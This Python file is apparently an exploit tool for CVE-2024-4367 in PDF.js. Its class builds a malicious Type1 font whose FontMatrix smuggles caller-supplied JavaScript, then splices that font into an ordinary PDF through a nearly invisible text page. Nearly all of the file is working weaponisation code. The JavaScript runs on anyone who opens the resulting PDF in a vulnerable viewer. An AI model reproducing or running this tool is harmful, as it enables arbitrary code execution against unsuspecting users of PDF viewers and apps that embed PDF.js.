import io

from core.imp import *
from core import Pdf

# reference: https://forum.obsidian.md/t/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js/82248


class ExploitPdfjs():
    def __init__(self, font_path: str, js: str) -> None:
        self.js = js
        with open(font_path, "rb") as f:
            b = f.read()
            self.font_binary = b

    def _make_evil_font(self, pdf: PdfDocCommon) -> int:
        """在指定 pdf 中添加恶意字体

        Args:
            pdf (PdfDocCommon): _description_
            js (str): _description_

        Returns:
            int: _description_
        """
        print("[+] make evil font")

        o = StreamObject()
        o.update({
            NameObject("/Filter"): NameObject("/FlateDecode"),
            NameObject("/Length1"): NumberObject(2462),
            NameObject("/Length"): NumberObject(19407),
        })
        o.set_data(self.font_binary)
        ref1 = pdf._add_object(o)

        fd = DictionaryObject()
        fd.update({
            NameObject("/Flags"): NumberObject(4),
            NameObject("/FontBBox"): ArrayObject([NumberObject(0), NumberObject(0), NumberObject(1), NumberObject(1)]),
            NameObject("/FontFile"): ref1,
            NameObject("/FontName"): NameObject("/SNCSTG+CMbX12"),
            NameObject("/ItalicAngle"): NumberObject(0),
            NameObject("/Type"): NameObject("/FontDescriptor"),
        })
        ref2 = pdf._add_object(fd)
        print(f"[+] fd ref: {ref2.idnum}")

        d = DictionaryObject()
        d.update({
            NameObject("/BaseFont"): NameObject("/SNCSTG+CMBX12"),
            NameObject("/FontDescriptor"): ref2,
            NameObject("/FontMatrix"): ArrayObject([NumberObject(1), NumberObject(2), NumberObject(3), NumberObject(4), NumberObject(5), TextStringObject(self.js)]),
            NameObject("/Subtype"): NameObject("/Type1"),
            NameObject("/Type"): NameObject("/Font"),
            NameObject("/Name"): NameObject("/F1")
        })

        ref = pdf._add_object(d)
        print(f"[+] add font object to pdf: {ref.idnum}")

        return ref.idnum

    def make(self) -> PdfWriter:
        print(f"[+] make a text pdf")
        packet = io.BytesIO()
        can = canvas.Canvas(packet, pagesize=letter)
        can.setFontSize(0.0001)
        can.drawString(0, 0, ".")
        can.save()

        # move to the beginning of the StringIO buffer
        packet.seek(0)

        # create a new PDF with Reportlab
        rPdf = PdfReader(packet)
        wPdf = PdfWriter(clone_from=rPdf)

        font_idx = self._make_evil_font(wPdf)

        for o in wPdf._objects:
            try:
                if o["/Resources"]:
                    resources = cast(DictionaryObject, o["/Resources"])
                    font = resources.raw_get("/Font")

                    if type(font) == IndirectObject:
                        font = cast(IndirectObject, font)
                        font_obj = cast(DictionaryObject,
                                        wPdf._objects[font.idnum-1])

                        # evil font
                        font_indirect = IndirectObject(font_idx, 0, wPdf)
                        font_indirect_ref = wPdf._add_object(font_indirect)

                        for k in font_obj.keys():
                            print(f"[+] set font: {k}")
                            v = font_obj.raw_get(k)
                            assert (isinstance(v, IndirectObject))
                            v.idnum = font_indirect_ref.idnum
                    else:
                        raise Exception(f"暂时不支持的字体类型: {type(font)}")
                    break
            except KeyError:
                pass

        return wPdf

    def exploit(self, pdf: Pdf):
        w = self.make()
        pdf.merge(w.pages[0], 0)
